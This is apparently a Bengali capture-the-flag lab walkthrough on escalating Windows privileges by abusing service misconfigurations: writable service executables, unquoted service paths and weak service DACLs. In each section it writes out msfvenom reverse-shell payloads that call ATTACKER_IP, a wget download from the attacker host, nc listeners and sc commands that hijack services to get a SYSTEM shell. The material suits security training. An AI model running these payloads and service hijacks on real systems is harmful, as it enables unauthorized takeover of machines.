# Abusing Service Misconfigurations

## 1. Windows Services

Windows Services SCM (Service Control Manager) দিয়ে manage হয়। SCM service-এর status ও configuration নিয়ন্ত্রণ করে এবং service চালু হলে তার executable run করে। প্রতিটি service নির্দিষ্ট user account-এর privilege-এ চলে।

Service configuration check:

```
sc qc apphostsvc
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20   WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

- `BINARY_PATH_NAME`: Service executable-এর path।
- `SERVICE_START_NAME`: কোন user-এর privilege-এ service চলবে।

প্রতিটি service-এর DACL থাকে, যা নির্ধারণ করে কারা service start, stop, pause বা reconfigure করতে পারবে।

Registry location:

```
HKLM\SYSTEM\CurrentControlSet\Services\
```

- প্রতিটি service-এর জন্য আলাদা subkey থাকে।
- `ImagePath`: Executable path।
- `ObjectName`: Service চালানোর user account।
- `Security`: Service DACL।
- Defaultভাবে শুধু Administrator এসব registry entry modify করতে পারে।

## 2. Insecure Permissions on Service Executable

Service executable modify বা replace করার permission থাকলে সেটিকে malicious executable দিয়ে replace করে service account-এর privilege পাওয়া যায়।

Example: Splinterware System Scheduler

Configuration check:

```
sc qc WindowsScheduler
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10   WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Executable permission check:

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

Output:

```
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

`Everyone`-এর Modify `(M)` permission থাকায় executable replace করা যাবে।

Payload তৈরি ও serve:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server
```

Target-এ download:

```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Original executable backup ও replace:

```
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe

icacls WService.exe /grant Everyone:F
```

Attacker machine-এ listener:

```
nc -lvp 4445
```

Service restart:

```
sc stop windowsscheduler
sc start windowsscheduler
```

PowerShell-এ `sc` হলো `Set-Content`-এর alias। তাই service control করতে `sc.exe` ব্যবহার করতে হবে।

Reverse shell:

```
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

`svcusr1` Desktop থেকে flag নিতে হবে এবং submit করতে হবে।

## 3. Unquoted Service Paths

Service executable-এর path-এ space থাকলেও quotation mark না থাকলে SCM ভুল executable খুঁজে চালাতে পারে।

Correctly quoted path:

```
sc qc "vncserver"
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10   WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

PowerShell-এ service control করতে `sc.exe` ব্যবহার করতে হবে।

Unquoted path:

```
sc qc "disk sorter enterprise"
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10   WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

SCM নিচের path-গুলো ক্রমানুসারে search করে:

| Command                                                | Argument 1                 | Argument 2                 |
| ------------------------------------------------------ | -------------------------- | -------------------------- |
| `C:\MyPrograms\Disk.exe`                               | Sorter                     | Enterprise\bin\disksrs.exe |
| `C:\MyPrograms\Disk Sorter.exe`                        | Enterprise\bin\disksrs.exe |                            |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` |                            |                            |

SCM-এর search order:

1. `C:\MyPrograms\Disk.exe` থাকলে সেটি execute হবে।
2. না থাকলে `C:\MyPrograms\Disk Sorter.exe` execute হবে।
3. সেটিও না থাকলে original executable `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` execute হবে।

তাই আগে search করা path-এ attacker executable তৈরি করলে service সেটি চালাবে।

সাধারণত `C:\Program Files` ও `C:\Program Files (x86)` unprivileged user-এর জন্য writable নয়। তবে:

- Installer folder permission দুর্বল করতে পারে।
- Administrator service binary non-default writable path-এ install করতে পারে।

Folder permission check:

```
icacls c:\MyPrograms
```

Output:

```
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

- `AD`: Subdirectory তৈরি করতে পারে।
- `WD`: File তৈরি করতে পারে।

Payload তৈরি ও listener চালু:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

nc -lvp 4446
```

Payload `C:\MyPrograms\Disk.exe`-এ move:

```
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

Service restart:

```
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

Reverse shell:

```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

`svcusr2` Desktop থেকে flag নিয়ে submit করতে হবে।

## 4. Insecure Service Permissions

Executable permission ঠিক থাকলেও service-এর নিজের DACL দুর্বল হলে service configuration পরিবর্তন করা সম্ভব।

এতে executable path ও service account পরিবর্তন করে `SYSTEM` privilege পাওয়া যায়।

Accesschk দিয়ে DACL check:

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

Output:

```
[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
      SERVICE_QUERY_STATUS
      SERVICE_QUERY_CONFIG
      SERVICE_INTERROGATE
      SERVICE_ENUMERATE_DEPENDENTS
      SERVICE_PAUSE_CONTINUE
      SERVICE_START
      SERVICE_STOP
      SERVICE_USER_DEFINED_CONTROL
      READ_CONTROL
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
      SERVICE_ALL_ACCESS
```

`BUILTIN\Users`-এর `SERVICE_ALL_ACCESS` থাকলে যেকোনো user service reconfigure করতে পারে।

Payload তৈরি ও listener:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

nc -lvp 4447
```

Payload target machine-এর `C:\Users\thm-unpriv\rev-svc3.exe`-এ transfer করতে হবে।

Execute permission:

```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Service executable ও account পরিবর্তন:

```
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

`sc.exe` command-এ `=`-এর পরে space দিতে হবে।

`obj= LocalSystem` দিয়ে service-কে সর্বোচ্চ privilege-এর account-এ চালানো হচ্ছে।

Service restart:

```
sc stop THMService
sc start THMService
```

Reverse shell:

```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

Administrator Desktop থেকে flag নিয়ে submit করতে হবে।

মনে রাখার মতো পার্থক্য:

| Misconfiguration             | কী দুর্বল                                           | ফলাফল                              |
| ---------------------------- | --------------------------------------------------- | ---------------------------------- |
| Insecure Service Executable  | Executable-এর permission                            | Service account-এর privilege       |
| Unquoted Service Path        | Executable path-এ quotation নেই + writable location | Service account-এর privilege       |
| Insecure Service Permissions | Service-এর DACL                                     | নিজের পছন্দের account, যেমন SYSTEM |
